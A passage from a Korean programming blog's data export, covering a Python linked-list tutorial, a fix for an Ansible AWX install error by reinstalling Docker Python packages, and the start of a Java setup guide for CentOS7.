class=\"token builtin\">next</span><span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\tself<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data\r\n\t\tself<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span>\r\n\r\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">NodeMgmt</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\tself<span class=\"token punctuation\">.</span>head <span class=\"token operator\">=</span> Node<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\r\n\r\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\t<span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>head <span class=\"token operator\">==</span> <span class=\"token string\">''</span><span class=\"token punctuation\">:</span>\r\n\t\t\tself<span class=\"token punctuation\">.</span>head <span class=\"token operator\">=</span> Node<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\r\n\t\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\r\n\t\t\tnode <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>head\r\n\t\t\t<span class=\"token keyword\">while</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">:</span>\r\n\t\t\t\tnode <span class=\"token operator\">=</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span>\r\n\t\t\tnode<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span> <span class=\"token operator\">=</span> Node<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\r\n\r\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">desc</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\tnode <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>head\r\n\t\t<span class=\"token keyword\">while</span> node<span class=\"token punctuation\">:</span>\r\n\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\r\n\t\t\tnode <span class=\"token operator\">=</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span>\r\n\r\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\t<span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>head <span class=\"token operator\">==</span> <span class=\"token string\">''</span><span class=\"token punctuation\">:</span>\r\n\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"해당 값을 가진 노드 없음.\"</span><span class=\"token punctuation\">)</span>\r\n\t\t\t<span class=\"token keyword\">return</span>\r\n\r\n\t\t<span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span>data <span class=\"token operator\">==</span> data<span class=\"token punctuation\">:</span>\t<span class=\"token comment\"># self.head를 삭제해야 할 경우</span>\r\n\t\t\ttemp <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>head\r\n\t\t\tself<span class=\"token punctuation\">.</span>head <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span>\r\n\t\t\t<span class=\"token keyword\">del</span> temp\r\n\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\t<span class=\"token comment\"># self.head가 아닌 노드를 삭제할 경우</span>\r\n\t\t\tnode <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>head\r\n\t\t\t<span class=\"token keyword\">while</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">:</span>\r\n\t\t\t\t<span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">.</span>data <span class=\"token operator\">==</span> data<span class=\"token punctuation\">:</span>\r\n\t\t\t\t\ttemp <span class=\"token operator\">=</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span>\r\n\t\t\t\t\tnode<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span> <span class=\"token operator\">=</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span>\r\n\t\t\t\t\t<span class=\"token keyword\">del</span> temp\r\n\t\t\t\t\t<span class=\"token keyword\">return</span>\r\n\t\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t\t\t\t\tnode <span class=\"token operator\">=</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span>\r\n\r\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">search_node</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\tnode <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>head\r\n\t\t<span class=\"token keyword\">while</span> node<span class=\"token punctuation\">:</span>\r\n\t\t\t<span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>data <span class=\"token operator\">==</span> data<span class=\"token punctuation\">:</span>\r\n\t\t\t\t<span class=\"token keyword\">return</span> node\r\n\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t\t\t\tnode <span class=\"token operator\">=</span> node<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAFABQDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAG8AD//xAAUEAEAAAAAAAAAAAAAAAAAAAAQ/9oACAEBAAEFAn//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAUEAEAAAAAAAAAAAAAAAAAAAAQ/9oACAEBAAY/An//xAAXEAADAQAAAAAAAAAAAAAAAAAAARAR/9oACAEBAAE/IciP/9oADAMBAAIAAwAAABADz//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QP//EABkQAAMAAwAAAAAAAAAAAAAAAAABESExof/aAAgBAQABPxBS3m0jVj4aKn//2Q=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f814f810f1d64d02d19aac20d8c8560c/c9b55/0.webp 165w,\n/static/f814f810f1d64d02d19aac20d8c8560c/f2908/0.webp 330w,\n/static/f814f810f1d64d02d19aac20d8c8560c/cc661/0.webp 660w,\n/static/f814f810f1d64d02d19aac20d8c8560c/a66df/0.webp 990w,\n/static/f814f810f1d64d02d19aac20d8c8560c/d7218/0.webp 1067w\"\n              sizes=\"(max-width: 660px) 100vw, 660px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f814f810f1d64d02d19aac20d8c8560c/27f9f/0.jpg 165w,\n/static/f814f810f1d64d02d19aac20d8c8560c/80fc7/0.jpg 330w,\n/static/f814f810f1d64d02d19aac20d8c8560c/ee745/0.jpg 660w,\n/static/f814f810f1d64d02d19aac20d8c8560c/4017f/0.jpg 990w,\n/static/f814f810f1d64d02d19aac20d8c8560c/914ed/0.jpg 1067w\"\n            sizes=\"(max-width: 660px) 100vw, 660px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f814f810f1d64d02d19aac20d8c8560c/ee745/0.jpg\"\n            alt=\"00\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span>{: width=\"60%\" height=\"60%\"}</p>\n</li>\n<li>\n<p>사용</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">node_mgmt <span class=\"token operator\">=</span> NodeMgmt<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">for</span> data <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\tnode_mgmt<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- desc() start:\"</span><span class=\"token punctuation\">)</span>\r\nnode_mgmt<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- desc() end\"</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- print head address: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>node_mgmt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- delete head node\"</span><span class=\"token punctuation\">)</span>\r\nnode_mgmt<span class=\"token punctuation\">.</span>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- desc() start:\"</span><span class=\"token punctuation\">)</span>\r\nnode_mgmt<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- desc() end\"</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- delete node 4\"</span><span class=\"token punctuation\">)</span>\r\nnode_mgmt<span class=\"token punctuation\">.</span>delete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- desc() start:\"</span><span class=\"token punctuation\">)</span>\r\nnode_mgmt<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"- desc() end\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n</li>\n<li>\n<p>과정</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">node_mgmt <span class=\"token operator\">=</span> NodeMgmt<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><code class=\"language-text\">class NodeMgmt</code>의 초기화 과정 <code class=\"language-text\">__init__</code>을 거쳐감으로써 생성되는 Node 객체</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 434px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70.9090909090909%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAQACBf/EABQBAQAAAAAAAAAAAAAAAAAAAAH/2gAMAwEAAhADEAAAAe6Imph//8QAFhAAAwAAAAAAAAAAAAAAAAAAEBEg/9oACAEBAAEFAoQ//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAFBABAAAAAAAAAAAAAAAAAAAAIP/aAAgBAQAGPwJf/8QAGRABAAIDAAAAAAAAAAAAAAAAAQAQYXGh/9oACAEBAAE/IWDjtJDSv//aAAwDAQACAAMAAAAQ5w//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/ED//xAAVEQEBAAAAAAAAAAAAAAAAAAABEP/aAAgBAgEBPxAn/8QAGhABAAMBAQEAAAAAAAAAAAAAAQARMSFBUf/aAAgBAQABPxClNvTy4mqH51DIKYXXGKFBSGT/2Q=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/65795873623cb4e6914180a67bf7d43a/c9b55/1.webp 165w,\n/static/65795873623cb4e6914180a67bf7d43a/f2908/1.webp 330w,\n/static/65795873623cb4e6914180a67bf7d43a/e6590/1.webp 434w\"\n              sizes=\"(max-width: 434px) 100vw, 434px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/65795873623cb4e6914180a67bf7d43a/27f9f/1.jpg 165w,\n/static/65795873623cb4e6914180a67bf7d43a/80fc7/1.jpg 330w,\n/static/65795873623cb4e6914180a67bf7d43a/57fda/1.jpg 434w\"\n            sizes=\"(max-width: 434px) 100vw, 434px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/65795873623cb4e6914180a67bf7d43a/57fda/1.jpg\"\n            alt=\"01\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span>{: width=\"60%\" height=\"60%\"}</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> data <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\tnode_mgmt<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></code></pre></div>\n<p>반복문 중 <code class=\"language-text\">node_mgmt.add(1)</code> 과정</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 126.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAZABQDASIAAhEBAxEB/8QAGAABAAMBAAAAAAAAAAAAAAAAAAECAwX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAB7oLAzaEhJf/EABQQAQAAAAAAAAAAAAAAAAAAADD/2gAIAQEAAQUCT//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/ASH/xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAECAQE/AR//xAAUEAEAAAAAAAAAAAAAAAAAAAAw/9oACAEBAAY/Ak//xAAdEAABBAIDAAAAAAAAAAAAAAABABARMSBhIXGx/9oACAEBAAE/IShG2MKOmN8+IapCsP/aAAwDAQACAAMAAAAQ4ACw/8QAFhEBAQEAAAAAAAAAAAAAAAAAEAER/9oACAEDAQE/ENIP/8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QKf/EAB0QAQACAQUBAAAAAAAAAAAAAAEAETEQIUFRYaH/2gAIAQEAAT8QrTZZzEGg0Pkl+kEbhfuoY3+Q10X6gd6JbGJbKOv/2Q=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4560a1b5400dda0c5189516998b4b38d/c9b55/2.webp 165w,\n/static/4560a1b5400dda0c5189516998b4b38d/f2908/2.webp 330w,\n/static/4560a1b5400dda0c5189516998b4b38d/d95e5/2.webp 639w\"\n              sizes=\"(max-width: 639px) 100vw, 639px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4560a1b5400dda0c5189516998b4b38d/27f9f/2.jpg 165w,\n/static/4560a1b5400dda0c5189516998b4b38d/80fc7/2.jpg 330w,\n/static/4560a1b5400dda0c5189516998b4b38d/df7e7/2.jpg 639w\"\n            sizes=\"(max-width: 639px) 100vw, 639px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4560a1b5400dda0c5189516998b4b38d/df7e7/2.jpg\"\n            alt=\"02\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span>{: width=\"60%\" height=\"60%\"}</p>\n<p>반복문 중 <code class=\"language-text\">node_mgmt.add(2)</code> 과정</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 176.36363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAjABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAAIBBf/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAAHu7JLCyYlsKwSgv//EABgQAAIDAAAAAAAAAAAAAAAAAAEQABEw/9oACAEBAAEFAmYHeH//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAEDAQE/AV//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAECAQE/AV//xAAUEAEAAAAAAAAAAAAAAAAAAAAw/9oACAEBAAY/An//xAAZEAEAAwEBAAAAAAAAAAAAAAABABARMSH/2gAIAQEAAT8hYO11FTZfZpvLA2v/2gAMAwEAAgADAAAAEPwKjPQP/8QAFhEBAQEAAAAAAAAAAAAAAAAAEAER/9oACAEDAQE/ENKU/8QAFREBAQAAAAAAAAAAAAAAAAAAESD/2gAIAQIBAT8QK//EAB0QAAICAgMBAAAAAAAAAAAAAAERACEQMUFRcYH/2gAIAQEAAT8QNbfwxB4I0YHsBSCeNxzfUFqAWABDcCRKXUBcQMaVrUQE/9k='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7bcac51255e6b91b265e3eb94aabf675/c9b55/3.webp 165w,\n/static/7bcac51255e6b91b265e3eb94aabf675/f2908/3.webp 330w,\n/static/7bcac51255e6b91b265e3eb94aabf675/cc661/3.webp 660w,\n/static/7bcac51255e6b91b265e3eb94aabf675/8bcb7/3.webp 899w\"\n              sizes=\"(max-width: 660px) 100vw, 660px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7bcac51255e6b91b265e3eb94aabf675/27f9f/3.jpg 165w,\n/static/7bcac51255e6b91b265e3eb94aabf675/80fc7/3.jpg 330w,\n/static/7bcac51255e6b91b265e3eb94aabf675/ee745/3.jpg 660w,\n/static/7bcac51255e6b91b265e3eb94aabf675/b2161/3.jpg 899w\"\n            sizes=\"(max-width: 660px) 100vw, 660px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7bcac51255e6b91b265e3eb94aabf675/ee745/3.jpg\"\n            alt=\"03\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span>{: width=\"60%\" height=\"60%\"}</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">node_mgmt<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAJABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAAECBf/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAAHutRCl/8QAFhAAAwAAAAAAAAAAAAAAAAAAABEg/9oACAEBAAEFAhz/AP/EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABQQAQAAAAAAAAAAAAAAAAAAACD/2gAIAQEABj8CX//EABcQAAMBAAAAAAAAAAAAAAAAAAABEBH/2gAIAQEAAT8h0dOf/9oADAMBAAIAAwAAABCfD//EABYRAAMAAAAAAAAAAAAAAAAAAAEQMf/aAAgBAwEBPxAxf//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QP//EABoQAQACAwEAAAAAAAAAAAAAAAEAERBBcZH/2gAIAQEAAT8QEaYgXXsGy8adx//Z'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e1c7038d9f3201c79163a1024c65c224/c9b55/4.webp 165w,\n/static/e1c7038d9f3201c79163a1024c65c224/f2908/4.webp 330w,\n/static/e1c7038d9f3201c79163a1024c65c224/cc661/4.webp 660w,\n/static/e1c7038d9f3201c79163a1024c65c224/a66df/4.webp 990w,\n/static/e1c7038d9f3201c79163a1024c65c224/34186/4.webp 1118w\"\n              sizes=\"(max-width: 660px) 100vw, 660px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e1c7038d9f3201c79163a1024c65c224/27f9f/4.jpg 165w,\n/static/e1c7038d9f3201c79163a1024c65c224/80fc7/4.jpg 330w,\n/static/e1c7038d9f3201c79163a1024c65c224/ee745/4.jpg 660w,\n/static/e1c7038d9f3201c79163a1024c65c224/4017f/4.jpg 990w,\n/static/e1c7038d9f3201c79163a1024c65c224/c5fc9/4.jpg 1118w\"\n            sizes=\"(max-width: 660px) 100vw, 660px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e1c7038d9f3201c79163a1024c65c224/ee745/4.jpg\"\n            alt=\"04\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span>{: width=\"60%\" height=\"60%\"}</p>\n<p>항상 NodeMgmt의 node는 head부터 시작해서 next 방향으로 따라감</p>\n</li>\n</ol>","categories":["DataStructure"],"date":"December 28, 2020","description":"자료구조 기초","id":"ab91e2b2-b339-51be-a10a-299220d59c84","keywords":["cs","codingtest","python"],"slug":"/DataStructure-Linked-List/","title":"자료구조: Linked list","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>참고한 곳:</p>\n<p><a href=\"https://engineering.linecorp.com/ko/blog/ansible-awx-for-provisioning-1/\">프로비저닝 자동화를 위한 Ansible AWX, 설치부터 엔터프라이즈 환경 적용까지 – 1</a></p>\n<p><a href=\"https://tech.osci.kr/2019/05/24/77138487/\">간단한 AWX 설치 및 기본 사용방법</a></p>\n<p>위와 같이 설치하다 보면 특정 오류에 직면하게 된다.</p>\n<p><code class=\"language-text\">ansible-playbook -i inventory install.yml</code> 이후</p>\n<p><img src=\"./images/0.PNG\" alt=\"failed=1\"></p>\n<p>docker관련 python 모듈 사이에 충돌이 나는 듯 하다.</p>\n<p>아래의 명령어로 해결한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">pip uninstall <span class=\"token function\">docker</span> docker-py <span class=\"token function\">docker-compose</span>\r\npip <span class=\"token function\">install</span> <span class=\"token function\">docker-compose</span> --ignore-installed</code></pre></div>\n<p><img src=\"./images/1.PNG\" alt=\"failed=0\"></p>","categories":["misc","setting"],"date":"April 11, 2020","description":null,"id":"8ee9b901-eccd-56dc-920a-e399fb1cfd70","keywords":["centos","devops","ansible","docker"],"slug":"/Install-Ansible-with-troubleshooting/","title":"Ansible 설치 with troubleshooting","readingTime":{"text":"1 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>선수 요구사항:\r\nOracle 계정\r\nJava HotSpot(TM) 1.8.0_241\r\n앞으로 CentOS7에서 모든 WAS 테스트는 /was 경로에서 진행할 것이다.</p>\n<p>폐쇄망이라고 가정한다.</p>\n<h1>선수 요구사항을 위한 세팅</h1>\n<p>java를 설치한다.</p>\n<p><a href=\"https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\">여기</a>에서 리눅스용 자바를 다운받고 해당 CentOS로 옮겼다.</p>\n<p><img src=\"./images/0.PNG\" alt=\"oracle java download\"></p>\n<p><img src=\"./images/1.PNG\" alt=\"oracle java download\"></p>\n<p>내려받은 rpm 파일로 java를 설치한다.</p>\n<p><img src=\"./images/2.PNG\" alt=\"rpm\"></p>\n<p>root로 진행해야 한다.\r\n참고로 위에서 사용한 rpm 명령어의 옵션값은 아래와 같은 의미를 가진다.</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Option</th>\n<th align=\"center\">의미</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">-i</td>\n<td align=\"center\">Install(설치)</td>\n</tr>\n<tr>\n<td align=\"center\">-v</td>\n<td align=\"center\">Verbose(상세)</td>\n</tr>\n<tr>\n<td align=\"center\">-h</td>\n<td align=\"center\">Header(헤더를 표시)</td>\n</tr>\n<tr>\n<td align=\"center\">--prefix</td>\n<td align=\"center\">설치경로</td>\n</tr>\n</tbody>\n</table>\n<p>설치경로는 따로 설정하지 않아도 좋지만 따로 설정하지 않으면 /usr/경로 아래에 패키지가 설치될 것이다.\r\n위에서 prefix옵션 뒤의 경로는 미리 생성해둔 경로이다.</p>\n<p>설치 후 환경변수에 JAVA_HOME을 추가해 주어야 한다. 홈 경로의 .bash_profile을 아래와 같이 수정해 준다.\r\n(.bashrc에서 설정한 것들은 재접속하면 날아간다.)</p>\n<p><img src=\"./images/3.PNG\" alt=\".bash_profile\"></p>\n<p>그리고 아래와 같은 명령어로 수정된 .bash_profile 파일을 적용해 준다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">.</span> .bash_profile</code></pre></div>\n<p><a href=\"https://s01va.github.io/CentOS7%EC%97%90%EC%84%9C-X11-forwarding-%EC%84%A4%EC%A0%95/\">CentOS7에서 X11 forwarding 설정(X Window 설치)</a>를 해두면 이후 과정은 <a href=\"https://s01va.github.io/Windows-10%EC%97%90%EC%84%9C-WebLogic-12c-%EC%84%A4%EC%B9%98%ED%95%98%EA%B8%B0/\">이 